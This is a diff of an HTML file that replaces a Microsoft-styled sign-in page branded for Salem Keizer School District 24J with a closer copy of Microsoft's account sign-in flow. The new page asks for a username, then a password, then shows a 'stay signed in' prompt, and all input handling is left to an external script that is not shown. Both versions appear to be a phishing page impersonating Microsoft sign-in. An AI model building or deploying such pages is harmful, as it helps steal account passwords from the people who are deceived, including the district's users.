@@ -1,231 +1,96 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
-        }
-
-        body {
-            background-color: #f8f9fa;
-            color: #323130;
-            line-height: 1.5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 440px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-
-        .logo img {
-            height: 32px;
-        }
-
-        .login-box {
-            background-color: white;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-
-        .login-header {
-            padding: 24px 28px 20px;
-            border-bottom: 1px solid #edebe9;
-        }
-
-        .login-header h1 {
-            font-size: 21px;
-            font-weight: 600;
-            color: #323130;
-        }
-
-        .login-body {
-            padding: 28px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #323130;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 8px 12px;
-            font-size: 15px;
-            border: 1px solid #8a8886;
-            border-radius: 2px;
-            height: 36px;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 1px #0078d4;
-        }
-
-        .btn {
-            display: inline-block;
-            background-color: #0078d4;
-            color: white;
-            border: none;
-            padding: 8px 20px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 2px;
-            cursor: pointer;
-            height: 36px;
-            text-align: center;
-            text-decoration: none;
-        }
-
-        .btn:hover {
-            background-color: #106ebe;
-        }
-
-        .btn-block {
-            display: block;
-            width: 100%;
-        }
-
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .links a {
-            color: #0078d4;
-            text-decoration: none;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            margin-top: 40px;
-            text-align: center;
-            font-size: 12px;
-            color: #605e5c;
-        }
-
-        .footer a {
-            color: #605e5c;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .district-info {
-            background-color: #f3f2f1;
-            border-radius: 4px;
-            padding: 16px;
-            margin-top: 24px;
-            font-size: 14px;
-        }
-
-        .district-info h3 {
-            font-size: 16px;
-            margin-bottom: 8px;
-            color: #323130;
-        }
-
-        .district-info p {
-            margin-bottom: 8px;
-        }
-    </style>
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
 </head>
-<body>
-    <div class="login-container">
-        <div class="logo">
-            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M16 0C7.164 0 0 7.164 0 16C0 24.836 7.164 32 16 32C24.836 32 32 24.836 32 16C32 7.164 24.836 0 16 0Z" fill="#5D5A58"/>
-                <path d="M16 6C10.477 6 6 10.477 6 16C6 21.523 10.477 26 16 26C21.523 26 26 21.523 26 16C26 10.477 21.523 6 16 6Z" fill="white"/>
-                <path d="M16 10C12.686 10 10 12.686 10 16C10 19.314 12.686 22 16 22C19.314 22 22 19.314 22 16C22 12.686 19.314 10 16 10Z" fill="#5D5A58"/>
-            </svg>
-        </div>
-        
-        <div class="login-box">
-            <div class="login-header">
-                <h1>Sign in</h1>
-            </div>
-            <div class="login-body">
-                <form id="loginForm">
-                    <div class="form-group">
-                        <label for="email">Email, phone, or Skype</label>
-                        <input type="text" id="email" class="form-control" placeholder="someone@example.com">
-                    </div>
-                    <div class="form-group">
-                        <button type="submit" class="btn btn-block">Next</button>
-                    </div>
-                </form>
-                <div class="links">
-                    <a href="#">No account? Create one!</a><br>
-                    <a href="#">Sign in with Windows Hello or a security key</a>
-                </div>
-                
-                <div class="district-info">
-                    <h3>Salem Keizer School District 24J</h3>
-                    <p><strong>Not your district?</strong></p>
-                    <p><strong>Username hint:</strong><br>Email address (e.g., 12345@salemkeizer.org)</p>
-                    <p><strong>Password hint:</strong><br>K-5: Can use ParentVUE for password help.</p>
-                    <p><strong>Having trouble?</strong><br>Contact helpdesk@salkeiz.k12.or.us<br>Or get help logging in</p>
-                </div>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <a href="#">Terms of use</a>
-            <a href="#">Privacy & cookies</a>
-            <a href="#">...</a>
-        </div>
-    </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const loginForm = document.getElementById('loginForm');
-            
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const email = document.getElementById('email').value;
-                
-                if (!email) {
-                    alert('Please enter your email, phone, or Skype name.');
-                    return;
-                }
-                
-                // Redirect to your exact index.html file
-                window.location.href = 'index.html';
-            });
-        });
-    </script>
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="assets/question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
 </body>
+
 </html>
